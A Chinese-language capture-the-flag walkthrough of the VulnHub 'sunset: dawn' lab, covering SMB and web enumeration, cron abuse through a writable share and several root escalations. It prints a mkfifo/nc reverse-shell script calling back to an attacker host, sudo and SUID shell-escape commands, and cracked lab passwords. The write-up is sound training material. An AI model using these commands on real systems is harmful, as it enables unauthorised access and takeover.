# sunset: dawn

2024-5-20 https://www.vulnhub.com/entry/sunset-dawn,341/

difficulty: Easy

## IP

192.168.5.21

## Scan

Open Port -> 80,139,445,3306

```
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.15-MariaDB-1
|   Thread ID: 13
|   Capabilities flags: 63486
|   Some Capabilities: DontAllowDatabaseTableColumn, ConnectWithDatabase, IgnoreSigpipes, SupportsCompression, IgnoreSpaceBeforeParenthesis, InteractiveClient, Speaks41ProtocolNew, SupportsTransactions, Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolOld, ODBCClient, FoundRows, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: XpJ_"*Ir%^*UPn[]@imj
|_  Auth Plugin Name: mysql_native_password
```

先看看 SMB 上有什么内容：

```
smbclient -N -L //192.168.5.21

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
```

ITDEPT 是我们需要的，登陆 SMB：

```
smbclient -N //192.168.5.21/ITDEPT
```

目录中暂时没内容，但是可能为后门上传木马提供功能，先放在这里。

看看 80 对应的 web 服务有什么，首页没内容，进行目录扫描：

```
http://192.168.5.21/index.html           (Status: 200) [Size: 791]
http://192.168.5.21/logs                 (Status: 301) [Size: 311] [--> http://192.168.5.21/logs/]
http://192.168.5.21/cctv                 (Status: 301) [Size: 311] [--> http://192.168.5.21/cctv/]
```

同时发现这个目录可读可写：

```
smbmap -H 192.168.5.21
ITDEPT  READ, WRITE	PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
```

http://192.168.5.21/logs/ 中能看到系统的几个日志，只有 http://192.168.5.21/logs/management.log 能够访问，看看里面有什么信息。

```
/bin/sh -c /root/pspy64 > /var/www/html/logs/management.log
/bin/sh -c chmod 777 /home/dawn/ITDEPT/product-control
/bin/sh -c chmod 777 /home/dawn/ITDEPT/web-control
/bin/sh -c /home/ganimedes/phobos
/usr/sbin/CRON -f
/bin/sh -c /home/dawn/ITDEPT/web-control
/bin/sh -c /home/dawn/ITDEPT/product-control
```

根据上面摘出来的日志，发现这个日志由 pspy64 定时监控生成的，cron 定时任务每分钟执行，其中发现了 2 个用户 dawn 和 ganimedes，同时看到了一个重要目录名：ITDEPT，跟上面发现的 SMB 名字一样，会不会就是这个目录，同时发现定时任务在调用 web-control 和 product-control，这两个脚本。

尝试 SMB 中上传脚本，并且命名为 web-control，内容如下：

```
#!/bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.5.3 8888 >/tmp/f
```

kali 上监听 8888 端口后，等待 1 分钟，反弹的 shell 已经建立连接。

进入到 /home 目录后，发现了上面日志中的两个用户目录：dawn 和 ganimedes，分别查看是否有有用的信息，每看到什么有用信息。

看看 sudo 是否有特权程序：

```
www-data@dawn:/etc/systemd/system$ sudo -l
Matching Defaults entries for www-data on dawn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on dawn:
    (root) NOPASSWD: /usr/bin/sudo
```

直接可以进行利用，得到 root 权限：

```
www-data@dawn:/etc/systemd/system$ sudo -u root sudo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
flag.txt  pspy64
# cat flag.txt
Hello! whitecr0wz here. I would like to congratulate and thank you for finishing the ctf, however, there is another way of getting a shell(very similar though). Also, 4 other methods are available for rooting this box!

flag{3a3e52f0a6af0d6e36d7c1ced3a9fd59}
```

根据提示还有其他攻击路径，上面还有一个定时任务 /bin/sh -c /home/dawn/ITDEPT/product-control，让我们把上面的反弹脚本改成 product-control ，端口改为 7777，上传到 SMB 后，看看反弹得到了什么内容。

```
dawn@dawn:~$ id
uid=1000(dawn) gid=1000(dawn) groups=1000(dawn),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
```

看看这个用户有什么 sudo 特权：

```
dawn@dawn:~$ sudo -l
Matching Defaults entries for dawn on dawn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dawn may run the following commands on dawn:
    (root) NOPASSWD: /usr/bin/mysql
```

也可以进行利用，得到 root 权限：

```
sudo mysql -e '\! /bin/sh'
```

但是提示要输入密码，认证不通过，看看在系统中能不能找到这个密码。

在 dawn home 目录的.bash_history 文件中，找到了一串加密字符串，可能是 mysql 的密码：

```
dawn@dawn:~$ cat .bash_history
echo "$1$$bOKpT2ijO.XcGlpjgAup9/"
ls
ls -la
nano .bash_history
echo "$1$$bOKpT2ijO.XcGlpjgAup9/"
```

使用 john + rockyou 解密后，得到了密码：onii-chan29

再次尝试 sudo mysql ，输入密码 onii-chan29 看看密码对不对：

```
dawn@dawn:~$ sudo mysql -u root -p -e '\! /bin/sh'
Enter password:
# id
uid=0(root) gid=0(root) groups=0(root)
```

已经成功获得了 root 权限。

还有一条攻击路径，suid 中存在 /usr/bin/zsh，可以直接进行利用，也得到了 root 权限：

```
dawn@dawn:/etc/samba$ /usr/bin/zsh
#dawn# id
uid=1000(dawn) gid=1000(dawn) euid=0(root) groups=1000(dawn),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
#dawn# cd /root
#dawn# ls
flag.txt  pspy64
```

同时在 ganimedes 的目录中的.bash_history 文件中，找到了 ganimedes 的密码:thisisareallysecurepasswordnooneisgoingtoeverfind

所有能获得 root 的方法都已经找到。
